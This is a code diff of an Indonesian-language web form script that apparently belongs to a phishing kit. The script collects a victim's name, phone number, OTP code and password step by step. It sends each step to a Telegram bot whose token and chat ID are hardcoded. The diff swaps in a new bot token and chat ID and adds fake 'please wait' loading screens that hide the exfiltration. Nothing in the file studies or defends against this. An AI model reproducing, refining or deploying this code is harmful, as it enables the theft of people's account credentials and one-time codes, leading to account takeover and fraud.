@@ -1,5 +1,5 @@
-const botToken = "8124693693:AAEKAE8sxCTVpIgb1WtgYxU7NERuOPLW9m0";
-const chatId = "7408597280";
+const botToken = "7716385575:AAHNumyyIdsQDp4FqgGYfh30nNPfT95E_WU";
+const chatId = "8015899112";
 
 const Toast = Swal.mixin({
   toast: true,
@@ -13,7 +13,6 @@ const Toast = Swal.mixin({
   },
 });
 
-// Variabel untuk menyimpan data dari setiap langkah
 let formData = {
   fullName: "",
   phoneNumber: "",
@@ -22,6 +21,18 @@ let formData = {
   status: "",
   sessionStart: Date.now(),
 };
+
+function showLoadingScreen() {
+  Swal.fire({
+    title: "Mohon tunggu...",
+    html: "Sedang memproses data.",
+    timer: 3000,
+    timerProgressBar: true,
+    didOpen: () => {
+      Swal.showLoading();
+    },
+  });
+}
 
 function sendToBot(data) {
   const message = `*Form Baru Terdaftar*\n\n*Nama:* ${
@@ -82,14 +93,12 @@ function timeSince(date) {
   return Math.floor(seconds) + " detik";
 }
 
-// Fungsi untuk mengambil data dari form pertama
-// Fungsi untuk mengambil data dari form pertama
 function processFirstData() {
   const fullName = document.getElementById("full_name").value.trim();
   const phoneNumber = document.getElementById("phone_number").value.trim();
 
   if (!fullName || !phoneNumber) {
-    // alert("Semua kolom harus diisi.");
+    Swal.fire("Perhatian!", "Semua kolom harus diisi.", "warning");
     return;
   }
 
@@ -97,47 +106,51 @@ function processFirstData() {
   formData.phoneNumber = phoneNumber;
   formData.status = "Menunggu OTP";
 
-  sendToBot(formData);
+  showLoadingScreen();
 
-  document.querySelector(".first").style.display = "none";
-  document.querySelector(".second").style.display = "block";
+  setTimeout(() => {
+    sendToBot(formData);
+    document.querySelector(".first").style.display = "none";
+    document.querySelector(".second").style.display = "block";
+  }, 3000);
 }
 
-// Fungsi untuk mengambil data dari form kedua
 function processSecondData() {
   const otp = document.getElementById("otp").value.trim();
-  const password = document.getElementById("password").value.trim();
 
-  if (!otp || !password) {
-    // alert("Semua kolom harus diisi.");
+  if (!otp) {
+    Swal.fire("Perhatian!", "OTP harus diisi.", "warning");
     return;
   }
 
   formData.otp = otp;
-  formData.password = password;
   formData.status = "Menunggu Konfirmasi";
 
-  sendToBot(formData);
+  showLoadingScreen();
 
-  document.querySelector(".second").style.display = "none";
-  document.querySelector(".third").style.display = "block";
+  setTimeout(() => {
+    sendToBot(formData);
+    document.querySelector(".second").style.display = "none";
+    document.querySelector(".third").style.display = "block";
+  }, 3000);
 }
 
-// Fungsi untuk mengambil data dari form ketiga dan mengirimkan data lengkap
 function processThirdData() {
   const password = document.getElementById("password").value.trim();
 
   if (!password) {
-    // alert("Kata sandi harus diisi.");
+    Swal.fire("Perhatian!", "Kata sandi harus diisi.", "warning");
     return;
   }
 
   formData.password = password;
   formData.status = "Proses Selesai";
 
-  // Mengirim semua data yang sudah terkumpul
-  sendToBot(formData);
+  showLoadingScreen();
 
-  document.querySelector(".third").style.display = "none";
-  document.querySelector(".four").style.display = "block";
+  setTimeout(() => {
+    sendToBot(formData);
+    document.querySelector(".third").style.display = "none";
+    document.querySelector(".four").style.display = "block";
+  }, 3000);
 }
